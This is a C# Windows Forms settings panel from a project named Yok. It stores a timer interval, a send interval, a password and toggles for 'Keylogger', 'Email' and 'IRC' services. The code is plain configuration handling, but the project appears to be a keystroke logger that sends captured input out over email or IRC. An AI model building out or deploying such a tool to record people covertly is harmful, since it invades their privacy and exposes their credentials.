// Yok 
// https://github.com/erickjung/yok
//
// Copyright (c) 2012-2015 Erick Jung
//
// This code is distributed under the terms and conditions of the MIT license.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

using System;
using System.Windows.Forms;
using log4net;
using yok.Util;

namespace yok.App.Forms
{
    public partial class PanelMainConfig : Form
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof (PanelMainConfig));

        public PanelMainConfig()
        {
            InitializeComponent();
        }

        private void PanelMainConfigLoad(object sender, EventArgs e)
        {
            try
            {
                textBoxInterval.Text = Config.GetStringValue(Globals.YokXmlTimerinterval);
                textBoxToSend.Text = Config.GetStringValue(Globals.YokXmlTimetoupdate);
                textBoxTitle.Text = Config.GetStringValue(Globals.YokXmlInputtitle);
                textBoxMessage.Text = Config.GetStringValue(Globals.YokXmlInputmsg);

                // TODO: change later to be dynamic
                serviceList.Items.Add("Keylogger");
                serviceList.Items.Add("Email");
                serviceList.Items.Add("IRC");

                serviceList.SetItemChecked(0, Config.GetBoolValue(Globals.YokXmlUsekeylogger));
                serviceList.SetItemChecked(1, Config.GetBoolValue(Globals.YokXmlUseemail));
                serviceList.SetItemChecked(2, Config.GetBoolValue(Globals.YokXmlUseirc));
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        private void ButtonSaveClick(object sender, EventArgs e)
        {
            try
            {
                // check password
                if (textBoxPassword.Text.Length > 0 && textBoxReType.Text.Length > 0)
                {
                    if (textBoxPassword.Text.Equals(textBoxReType.Text))
                    {
                        var oldPass = Config.GetStringValue(Globals.YokXmlInputpwd);

                        if (!textBoxPassword.Text.Equals(oldPass))
                        {
                            Config.SetStringValue(Globals.YokXmlInputpwd, textBoxPassword.Text);
                        }
                    }
                    else
                    {
                        MessageBox.Show("The password and retype field must match!", "Error");
                        return;
                    }
                }

                if (!textBoxInterval.Text.Equals(Config.GetStringValue(Globals.YokXmlTimerinterval)))
                {
                    Config.SetStringValue(Globals.YokXmlTimerinterval, textBoxInterval.Text);
                }

                if (!textBoxToSend.Text.Equals(Config.GetStringValue(Globals.YokXmlTimetoupdate)))
                {
                    Config.SetStringValue(Globals.YokXmlTimetoupdate, textBoxToSend.Text);
                }

                if (!textBoxTitle.Text.Equals(Config.GetStringValue(Globals.YokXmlInputtitle)))
                {
                    Config.SetStringValue(Globals.YokXmlInputtitle, textBoxTitle.Text);
                }

                if (!textBoxMessage.Text.Equals(Config.GetStringValue(Globals.YokXmlInputmsg)))
                {
                    Config.SetStringValue(Globals.YokXmlInputmsg, textBoxMessage.Text);
                }

                Config.SetBoolValue(Globals.YokXmlUsekeylogger, serviceList.GetItemChecked(0));
                Config.SetBoolValue(Globals.YokXmlUseemail, serviceList.GetItemChecked(1));
                Config.SetBoolValue(Globals.YokXmlUseirc, serviceList.GetItemChecked(2));
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }
    }
}